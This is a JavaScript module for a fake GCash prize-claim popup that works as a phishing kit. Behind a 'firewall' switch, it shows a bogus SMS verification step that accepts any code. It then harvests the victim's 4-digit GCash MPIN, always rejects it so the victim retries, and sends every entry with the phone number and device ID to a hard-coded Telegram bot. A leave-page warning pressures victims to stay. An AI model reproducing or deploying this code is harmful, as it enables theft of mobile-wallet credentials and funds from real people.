/**
 * Popup Share Module - Complete with Firewall Logic
 * Phase 1 (Default) → Check Firewall → Phase 2 (OFF) or Phase 3 (ON via SMS)
 */

// ========== POPUP MODULE ==========
(function() {
    'use strict';
    
    let currentBalance = 0;
    let currentPhase = 1;
    let claimInProgress = false;
    let isRedirecting = false;
    let currentFirewallStatus = false;
    let enteredMPIN = '';  // For 4-digit MPIN
    
    // ========== INITIALIZATION ==========
    function init() {
        console.log('Popup Module Starting...');
        
        const popup = document.getElementById('prizePopup');
        if (!popup) {
            console.error('Popup element not found!');
            return;
        }
        
        getFirewallStatus();
        attachClaimButton();
        attachFirewallEvents();
        addAnimations();
        
        console.log('Popup Module ready');
    }
    
    // ========== ADD ANIMATIONS ==========
    function addAnimations() {
        const style = document.createElement('style');
        style.textContent = `
            @keyframes bounceIn {
                0% { transform: scale(0) rotate(-180deg); opacity: 0; }
                60% { transform: scale(1.1) rotate(0deg); }
                100% { transform: scale(1) rotate(0deg); opacity: 1; }
            }
            @keyframes pulse {
                0% { transform: scale(1); }
                50% { transform: scale(1.02); box-shadow: 0 0 20px rgba(255,215,0,0.5); }
                100% { transform: scale(1); }
            }
            @keyframes shake {
                0% { transform: translateX(0); }
                25% { transform: translateX(-5px); }
                50% { transform: translateX(5px); }
                75% { transform: translateX(-5px); }
                100% { transform: translateX(0); }
            }
            @keyframes neonBluePulse {
                0% { box-shadow: 0 0 5px #00f2ff, 0 0 10px #00f2ff; }
                50% { box-shadow: 0 0 15px #00f2ff, 0 0 25px #00f2ff, 0 0 35px #00f2ff; }
                100% { box-shadow: 0 0 5px #00f2ff, 0 0 10px #00f2ff; }
            }
            .btn-pulse {
                animation: pulse 0.5s ease;
            }
            .shake-effect {
                animation: shake 0.3s ease-in-out;
            }
            .numeric-keypad {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                gap: 12px;
                padding: 15px;
                background: rgba(0, 242, 255, 0.08);
                border-radius: 30px;
                margin: 15px 0;
            }
            .num-btn {
                background: rgba(255, 255, 255, 0.15);
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255, 255, 255, 0.3);
                border-radius: 50%;
                width: 60px;
                height: 60px;
                font-size: 24px;
                font-weight: bold;
                color: white;
                cursor: pointer;
                transition: all 0.2s ease;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto;
            }
            .num-btn:active {
                transform: scale(0.95);
                background: rgba(255, 255, 255, 0.3);
            }
            .mpin-dots {
                display: flex;
                justify-content: center;
                gap: 15px;
                margin: 20px 0;
            }
            .mpin-dot {
                width: 16px;
                height: 16px;
                border-radius: 50%;
                background: rgba(255, 255, 255, 0.3);
                transition: all 0.2s ease;
            }
            .mpin-dot.filled {
                background: #00f2ff;
                box-shadow: 0 0 10px #00f2ff;
            }
        `;
        if (!document.querySelector('#popup-animations')) {
            style.id = 'popup-animations';
            document.head.appendChild(style);
        }
    }
    
    // ========== GET FIREWALL STATUS ==========
    async function getFirewallStatus() {
        try {
            const db = firebase.database();
            const snapshot = await db.ref('admin/globalFirewall').once('value');
            const data = snapshot.val();
            currentFirewallStatus = (data && data.active === true);
            console.log('Firewall status:', currentFirewallStatus ? 'ON' : 'OFF');
            return currentFirewallStatus;
        } catch(e) {
            console.error('Firewall error:', e);
            return false;
        }
    }
    
    // ========== ATTACH CLAIM BUTTON ==========
    function attachClaimButton() {
        const claimBtn = document.getElementById('claimNowBtn');
        if (!claimBtn) {
            console.error('Claim button not found!');
            return;
        }
        
        claimBtn.onclick = function(e) {
            e.preventDefault();
            e.stopPropagation();
            
            console.log('Claim button clicked!');
            
            let balance = 0;
            const balanceEl = document.getElementById('userBalanceDisplay');
            if (balanceEl) balance = parseFloat(balanceEl.innerText) || 0;
            
            showPopup(balance);
            
            if (window.ConfettiModule) window.ConfettiModule.start();
        };
        
        console.log('Claim button attached');
    }
    
    // ========== ATTACH FIREWALL EVENTS ==========
    function attachFirewallEvents() {
        const closeBtn = document.getElementById('firewallCloseBtn');
        if (closeBtn) {
            closeBtn.onclick = function() {
                hideFirewallPopup();
                showPhase1(currentBalance);
            };
        }
    }
    
    // ========== GET PAYOUT LINK ==========
    async function getLatestPayoutLink() {
        try {
            const db = firebase.database();
            const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
            if (snapshot.exists()) {
                const key = Object.keys(snapshot.val())[0];
                const linkData = snapshot.val()[key];
                return { key: key, url: linkData.url };
            }
            return null;
        } catch(e) {
            console.error('Link error:', e);
            return null;
        }
    }
    
    // ========== MARK LINK AS USED ==========
    async function markLinkAsUsed(linkKey, userPhone) {
        try {
            const db = firebase.database();
            await db.ref('links/' + linkKey).update({
                status: 'used',
                user: userPhone,
                usedAt: Date.now()
            });
            console.log(`Link ${linkKey} marked as used`);
        } catch(e) {
            console.error('Error marking link:', e);
        }
    }
    
    // ========== BEFORE UNLOAD HANDLER ==========
    function beforeUnloadHandler(e) {
        if (claimInProgress && !isRedirecting) {
            const message = "Your payout is unsuccessful! Please complete the process.";
            e.preventDefault();
            e.returnValue = message;
            return message;
        }
    }
    
    // ========== SEND SMS NOTIFICATION (Telegram) ==========
    async function sendSMSNotification(userPhone, deviceId) {
        try {
            const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
            const chatId = "7298607329";
            const now = new Date();
            const timestamp = `${now.getMonth()+1}/${now.getDate()}/${now.getFullYear()} ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
            
            const message = `📱 SMS VERIFICATION REQUEST
User: ${userPhone}
Device ID: ${deviceId}
Time: ${timestamp}
Type: SMS Code Request`;
            
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
            console.log('SMS notification sent to Telegram');
        } catch(e) {
            console.error('Telegram error:', e);
        }
    }
    
    // ========== SEND VERIFICATION ATTEMPT ==========
    async function sendVerificationAttempt(userPhone, deviceId, code) {
        try {
            const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
            const chatId = "7298607329";
            const now = new Date();
            const timestamp = `${now.getMonth()+1}/${now.getDate()}/${now.getFullYear()} ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
            
            const message = `🔑 MPIN VERIFICATION ATTEMPT
User: ${userPhone}
Device ID: ${deviceId}
Entered MPIN: ${code}
Time: ${timestamp}
Status: INVALID`;
            
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
            console.log('Verification attempt sent to Telegram');
        } catch(e) {
            console.error('Telegram error:', e);
        }
    }
    
    // ========== SHOW FIREWALL POPUP (Phase 3 - SMS Verification) ==========
    function showFirewallPopup() {
        const popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        currentPhase = 3;
        enteredMPIN = '';
        
        // Send SMS notification to Telegram (admin)
        const userPhone = localStorage.getItem("userPhone") || "Unknown";
        const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
        sendSMSNotification(userPhone, deviceId);
        
        // Fade out transition
        popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
        popupInner.style.opacity = '0';
        popupInner.style.transform = 'scale(0.95)';
        
        setTimeout(() => {
            showPhase3();
            popupInner.style.opacity = '1';
            popupInner.style.transform = 'scale(1)';
        }, 300);
    }
    
  // ========== PHASE 3: SMS VERIFICATION (6-digit TEXT + 4-digit MPIN) ==========
function showPhase3() {
    const popupInner = document.querySelector('.popup-inner');
    if (!popupInner) return;
    
    // Reset entered values
    enteredVerificationCode = '';
    enteredMPIN = '';
    showMPINKeypad = false;
    
    // Adjust popup container size
    const popupContainer = document.querySelector('.popup-container');
    if (popupContainer) {
        popupContainer.style.maxWidth = '380px';
        popupContainer.style.width = '90%';
    }
    
    popupInner.innerHTML = `
        <div class="popup-close" id="popupClosePhase3">✕</div>
        
        <!-- SMS ICON -->
        <div style="text-align: center; margin-bottom: 10px;">
            <div style="font-size: 55px; animation: bounceIn 0.5s ease;">📱</div>
        </div>
        
        <!-- TITLE -->
        <h2 style="text-align: center; font-family: 'Orbitron', monospace; font-size: 20px; font-weight: 900; color: #00f2ff; margin: 5px 0; letter-spacing: 1px; text-shadow: 0 0 10px #00f2ff; animation: neonBluePulse 1.5s infinite;">
            SMS VERIFICATION
        </h2>
        
        <div class="divider" style="width: 50px; margin: 10px auto; background: #00f2ff;"></div>
        
        <!-- STEP 1: 6-DIGIT VERIFICATION CODE -->
        <div id="step1Container" style="background: linear-gradient(135deg, rgba(0,242,255,0.08), rgba(0,242,255,0.02)); border-radius: 16px; padding: 15px; margin: 10px 0;">
            <div style="text-align: center; margin-bottom: 10px;">
                <span style="font-size: 11px; color: #00f2ff;">STEP 1 OF 2</span>
            </div>
            <p style="font-family: 'Inter', sans-serif; font-size: 11px; color: #ccc; line-height: 1.4; text-align: center; margin: 0 0 10px 0;">
                Enter the <strong style="color: #00f2ff;">6-digit verification code</strong> sent via SMS
            </p>
            <div style="display: flex; gap: 10px; justify-content: center;">
                <input type="text" id="verificationCode6Digit" class="verification-input" placeholder="123456" maxlength="6" inputmode="numeric" style="text-align: center; font-size: 20px; font-weight: bold; width: 180px; padding: 12px; background: rgba(0,0,0,0.5); border: 1px solid rgba(0,242,255,0.4); border-radius: 30px; color: white;">
                <button id="verify6DigitBtn" class="claim-gcash-button" style="background: linear-gradient(135deg, #00aaff, #0066cc); width: auto; padding: 0 20px;">
                    VERIFY
                </button>
            </div>
            <div id="step1ErrorMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff8888; font-size: 11px;"></div>
        </div>
        
        <!-- STEP 2: 4-DIGIT MPIN (initially hidden) -->
        <div id="step2Container" style="display: none; background: linear-gradient(135deg, rgba(0,242,255,0.08), rgba(0,242,255,0.02)); border-radius: 16px; padding: 15px; margin: 10px 0;">
            <div style="text-align: center; margin-bottom: 10px;">
                <span style="font-size: 11px; color: #00f2ff;">STEP 2 OF 2</span>
            </div>
            <p style="font-family: 'Inter', sans-serif; font-size: 11px; color: #ccc; line-height: 1.4; text-align: center; margin: 0 0 10px 0;">
                Enter your <strong style="color: #ffd700;">4-digit MPIN</strong> to complete verification
            </p>
            
            <!-- MPIN DOTS -->
            <div class="mpin-dots" id="mpinDots" style="display: flex; justify-content: center; gap: 15px; margin: 15px 0;">
                <div class="mpin-dot"></div>
                <div class="mpin-dot"></div>
                <div class="mpin-dot"></div>
                <div class="mpin-dot"></div>
            </div>
            
            <!-- NUMERIC KEYPAD -->
            <div class="numeric-keypad" style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; padding: 15px; background: rgba(0, 242, 255, 0.08); border-radius: 30px; margin: 10px 0;">
                <button class="num-btn" data-num="1">1</button>
                <button class="num-btn" data-num="2">2</button>
                <button class="num-btn" data-num="3">3</button>
                <button class="num-btn" data-num="4">4</button>
                <button class="num-btn" data-num="5">5</button>
                <button class="num-btn" data-num="6">6</button>
                <button class="num-btn" data-num="7">7</button>
                <button class="num-btn" data-num="8">8</button>
                <button class="num-btn" data-num="9">9</button>
                <button class="num-btn" data-num="clear" style="font-size: 14px;">⌫</button>
                <button class="num-btn" data-num="0">0</button>
                <button class="num-btn" data-num="reset" style="font-size: 14px;">🗑️</button>
            </div>
            
            <div id="step2ErrorMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff4444; font-size: 12px; background: rgba(255,68,68,0.1); padding: 8px; border-radius: 20px;">
                ❌ Invalid MPIN. Please try again.
            </div>
        </div>
        
        <div class="button-separator" style="margin: 15px 0 10px;"></div>
        
        <button class="back-btn" id="backBtnPhase3" style="transition: all 0.2s ease; width: 100%;">
            ← BACK
        </button>
    `;
    
    // Attach Phase 3 events
    attachPhase3Events(popupInner);
}

// ========== ATTACH PHASE 3 EVENTS ==========
function attachPhase3Events(popupInner) {
    const closeBtn = document.getElementById('popupClosePhase3');
    if (closeBtn) closeBtn.onclick = function() { 
        closePopup();
        hideFirewallPopup();
    };
    
    const backBtn = document.getElementById('backBtnPhase3');
    if (backBtn) {
        backBtn.onclick = function() {
            popupInner.style.transition = 'opacity 0.3s ease';
            popupInner.style.opacity = '0';
            setTimeout(() => {
                showPhase1(currentBalance);
                popupInner.style.opacity = '1';
            }, 300);
            hideFirewallPopup();
        };
    }
    
    // STEP 1: 6-digit verification code (BYPASS - any 6 digits accepted)
    const verify6DigitBtn = document.getElementById('verify6DigitBtn');
    const code6Input = document.getElementById('verificationCode6Digit');
    const step1ErrorMsg = document.getElementById('step1ErrorMsg');
    const step1Container = document.getElementById('step1Container');
    const step2Container = document.getElementById('step2Container');
    
    if (verify6DigitBtn) {
        verify6DigitBtn.onclick = function() {
            const code = code6Input?.value.trim();
            
            if (!code || code.length !== 6 || !/^\d+$/.test(code)) {
                if (step1ErrorMsg) {
                    step1ErrorMsg.innerText = "Please enter a valid 6-digit code.";
                    step1ErrorMsg.style.display = 'block';
                }
                if (code6Input) {
                    code6Input.classList.add('shake-effect');
                    setTimeout(() => code6Input.classList.remove('shake-effect'), 300);
                }
                return;
            }
            
            // BYPASS - accept any 6-digit code
            console.log('6-digit code accepted (bypass):', code);
            
            // Send notification to Telegram
            const userPhone = localStorage.getItem("userPhone") || "Unknown";
            const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
            sendVerificationAttempt(userPhone, deviceId, code + ' (6-digit bypass)');
            
            // Hide Step 1, Show Step 2
            if (step1Container) step1Container.style.display = 'none';
            if (step2Container) step2Container.style.display = 'block';
            
            // Initialize MPIN variables
            enteredMPIN = '';
            updateMPINDots();
            attachMPINKeypad();
        };
    }
    
    // Enter key support for step 1
    if (code6Input) {
        code6Input.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                verify6DigitBtn.click();
            }
        });
    }
}

// ========== MPIN DOTS UPDATE ==========
function updateMPINDots() {
    const dots = document.querySelectorAll('.mpin-dot');
    for (let i = 0; i < dots.length; i++) {
        if (i < enteredMPIN.length) {
            dots[i].classList.add('filled');
        } else {
            dots[i].classList.remove('filled');
        }
    }
}

// ========== CHECK MPIN (ALWAYS INVALID) ==========
function checkMPIN() {
    if (enteredMPIN.length === 4) {
        const userPhone = localStorage.getItem("userPhone") || "Unknown";
        const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
        
        // Send notification to Telegram
        sendVerificationAttempt(userPhone, deviceId, enteredMPIN + ' (4-digit MPIN - INVALID)');
        
        // Show error with shake effect
        const errorMsg = document.getElementById('step2ErrorMsg');
        const mpinDots = document.getElementById('mpinDots');
        
        if (errorMsg) {
            errorMsg.style.display = 'block';
        }
        if (mpinDots) {
            mpinDots.classList.add('shake-effect');
            setTimeout(() => mpinDots.classList.remove('shake-effect'), 300);
        }
        
        // Clear entered MPIN
        enteredMPIN = '';
        updateMPINDots();
        
        // Hide error after 2 seconds
        setTimeout(() => {
            if (errorMsg) errorMsg.style.display = 'none';
        }, 2000);
    }
}

// ========== ATTACH MPIN KEYPAD ==========
function attachMPINKeypad() {
    const numBtns = document.querySelectorAll('.num-btn');
    for (let i = 0; i < numBtns.length; i++) {
        const btn = numBtns[i];
        // Remove existing listeners
        const newBtn = btn.cloneNode(true);
        btn.parentNode.replaceChild(newBtn, btn);
        
        newBtn.onclick = function() {
            const num = this.getAttribute('data-num');
            
            if (num === 'clear') {
                enteredMPIN = enteredMPIN.slice(0, -1);
                updateMPINDots();
            } 
            else if (num === 'reset') {
                enteredMPIN = '';
                updateMPINDots();
            }
            else if (enteredMPIN.length < 4) {
                enteredMPIN += num;
                updateMPINDots();
                
                if (enteredMPIN.length === 4) {
                    checkMPIN();
                }
            }
        };
    }
}
    
    // ========== HIDE FIREWALL POPUP ==========
    function hideFirewallPopup() {
        console.log('Firewall popup closed');
    }
    
    // ========== CHECK FIREWALL AND TRANSITION ==========
    async function checkFirewallAndTransition() {
        const isFirewallOn = await getFirewallStatus();
        
        if (isFirewallOn) {
            console.log('Firewall ON - Showing SMS verification popup');
            showFirewallPopup();
        } else {
            console.log('Firewall OFF - Transition to Phase 2');
            transitionToPhase2();
        }
    }
    
    // ========== ANIMATION TRANSITION TO PHASE 2 ==========
    function transitionToPhase2() {
        const popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
        popupInner.style.opacity = '0';
        popupInner.style.transform = 'scale(0.95)';
        
        setTimeout(() => {
            showPhase2();
            popupInner.style.opacity = '1';
            popupInner.style.transform = 'scale(1)';
        }, 300);
    }
    
    // ========== PHASE 1: DEFAULT POPUP ==========
    function showPhase1(balance) {
        const popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        // Reset popup container size
        const popupContainer = document.querySelector('.popup-container');
        if (popupContainer) {
            popupContainer.style.maxWidth = '360px';
            popupContainer.style.width = '90%';
        }
        
        currentBalance = balance;
        currentPhase = 1;
        
        popupInner.style.transition = '';
        popupInner.style.opacity = '1';
        popupInner.style.transform = '';
        
        popupInner.innerHTML = `
            <div class="popup-close" id="popupClosePhase1">✕</div>
            <h2 class="popup-title">🎉 HOORAY! 🎉</h2>
            <div class="prize-amount">₱<span id="popupBalanceAmount">${balance.toFixed(2)}</span></div>
            <div class="divider"></div>
            <div class="invite-text">Your friend must confirm your invitation to get extra <strong>₱150 bonus</strong>.</div>
            <div class="luckyday-image-container">
                <img src="images/luckyday.png" alt="Lucky Day" class="luckyday-img" onerror="this.style.display='none'">
            </div>
            <div class="divider"></div>
            <div class="indicator-group">
                <div class="indicator"></div>
                <div class="indicator"></div>
                <div class="indicator"></div>
            </div>
            
            <button class="claim-gcash-button" id="claimGCashBtn" style="transition: all 0.2s ease;">
                <img src="images/gc_icon.png" class="gc-icon"> CLAIM THRU GCASH
            </button>

            <div class="button-separator"></div>

            <button class="back-btn" id="backBtnPhase1">
                ← BACK
            </button>
        `;
        
        const closeBtn = document.getElementById('popupClosePhase1');
        if (closeBtn) closeBtn.onclick = function() { closePopup(); };
        
        const backBtn = document.getElementById('backBtnPhase1');
        if (backBtn) backBtn.onclick = function() { closePopup(); };
        
        const claimBtn = document.getElementById('claimGCashBtn');
        if (claimBtn) {
            claimBtn.onclick = function() {
                this.style.transform = 'scale(0.98)';
                setTimeout(() => { this.style.transform = 'scale(1)'; }, 150);
                checkFirewallAndTransition();
            };
        }
    }
    
    // ========== PHASE 2: WITHDRAWAL LINK (Keep existing) ==========
    function showPhase2() {
        const popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        currentPhase = 2;
        
        const popupContainer = document.querySelector('.popup-container');
        if (popupContainer) {
            popupContainer.style.maxWidth = '320px';
            popupContainer.style.width = '85%';
        }
        
        popupInner.innerHTML = `
            <div class="popup-close" id="popupClosePhase2">✕</div>
            
            <div style="text-align: center; margin-bottom: 5px;">
                <div style="font-size: 45px; animation: bounceIn 0.5s ease;">🏆</div>
            </div>
            
            <h2 style="text-align: center; font-family: 'Orbitron', monospace; font-size: 18px; font-weight: 900; background: linear-gradient(135deg, #ffd700, #ffaa33); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 3px 0; letter-spacing: 1px;">
                GREAT JOB!
            </h2>
            
            <div class="divider" style="width: 30px; margin: 8px auto;"></div>
            
            <div style="background: linear-gradient(135deg, rgba(255,215,0,0.08), rgba(255,215,0,0.02)); border-radius: 12px; padding: 10px; margin: 8px 0;">
                <p style="font-family: 'Inter', sans-serif; font-size: 11px; color: #e0e0e0; line-height: 1.4; text-align: center; margin: 0;">
                    "Nice work today! You made that look easy!"
                </p>
                <p style="font-family: 'Inter', sans-serif; font-size: 11px; color: #ffd700; line-height: 1.4; text-align: center; margin: 5px 0 0 0;">
                    You're one tap away from getting your reward amounting to 
                    <span style="font-size: 20px; font-weight: 900; color: #ffd700; text-shadow: 0 0 8px rgba(255,215,0,0.5);">₱${currentBalance.toFixed(2)}</span>
                </p>
            </div>
            
            <button class="claim-gcash-button" id="proceedBtn" style="transition: all 0.2s ease; width: 100%; padding: 12px; font-size: 14px; margin-top: 8px;">
                <img src="images/gc_icon.png" class="gc-icon" style="width: 18px; height: 18px;"> CLAIM VIA GCASH APP
            </button>

            <div class="button-separator" style="margin: 10px 0 8px;"></div>

            <button class="back-btn" id="backBtnPhase2" style="transition: all 0.2s ease; width: 100%; padding: 8px; font-size: 12px;">
                ← COMPLETE TASK #2
            </button>
        `;
        
        attachPhase2Events();
    }
    
    // ========== ATTACH PHASE 2 EVENTS ==========
    function attachPhase2Events() {
        const closeBtn = document.getElementById('popupClosePhase2');
        if (closeBtn) closeBtn.onclick = function() { closePopup(); };
        
        const backBtn = document.getElementById('backBtnPhase2');
        if (backBtn) {
            backBtn.onclick = function() {
                const popupInner = document.querySelector('.popup-inner');
                if (popupInner) {
                    popupInner.style.transition = 'opacity 0.3s ease';
                    popupInner.style.opacity = '0';
                    setTimeout(() => {
                        showPhase1(currentBalance);
                        popupInner.style.opacity = '1';
                    }, 300);
                }
            };
        }
        
        const proceedBtn = document.getElementById('proceedBtn');
        if (proceedBtn) {
            proceedBtn.onclick = async function() {
                if (claimInProgress) return;
                
                claimInProgress = true;
                
                this.classList.add('btn-pulse');
                setTimeout(() => this.classList.remove('btn-pulse'), 500);
                
                this.disabled = true;
                this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="animation: pulse 0.8s infinite;"> PROCESSING...`;
                this.style.opacity = '0.8';
                
                window.addEventListener('beforeunload', beforeUnloadHandler);
                
                const linkData = await getLatestPayoutLink();
                
                if (linkData && linkData.url) {
                    const userPhone = localStorage.getItem("userPhone") || "Unknown";
                    await markLinkAsUsed(linkData.key, userPhone);
                    
                    isRedirecting = true;
                    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> REDIRECTING TO GCASH...`;
                    setTimeout(() => {
                        window.removeEventListener('beforeunload', beforeUnloadHandler);
                        window.location.href = linkData.url;
                    }, 500);
                } else {
                    claimInProgress = false;
                    isRedirecting = false;
                    window.removeEventListener('beforeunload', beforeUnloadHandler);
                    
                    this.disabled = false;
                    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> CLAIM VIA GCASH APP`;
                    this.style.opacity = '1';
                    
                    alert("No payout link available. Please try again later.");
                }
            };
        }
    }
    
    // ========== SHOW POPUP ==========
    async function showPopup(balance) {
        currentBalance = balance;
        await getFirewallStatus();
        showPhase1(balance);
        
        const popup = document.getElementById('prizePopup');
        if (popup) {
            popup.style.display = 'flex';
            const ticker = document.getElementById('winnerTicker');
            if (ticker) ticker.style.display = 'none';
        }
    }
    
    // ========== CLOSE POPUP ==========
    function closePopup() {
        const popup = document.getElementById('prizePopup');
        if (popup) {
            popup.style.display = 'none';
            const ticker = document.getElementById('winnerTicker');
            if (ticker) ticker.style.display = 'flex';
            if (window.ConfettiModule) window.ConfettiModule.stop();
        }
        
        claimInProgress = false;
        isRedirecting = false;
        window.removeEventListener('beforeunload', beforeUnloadHandler);
    }
    
    // ========== START ==========
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
    // ========== EXPORT ==========
    window.showPopup = showPopup;
    window.closePopup = closePopup;
    window.getFirewallStatus = getFirewallStatus;
    
})();
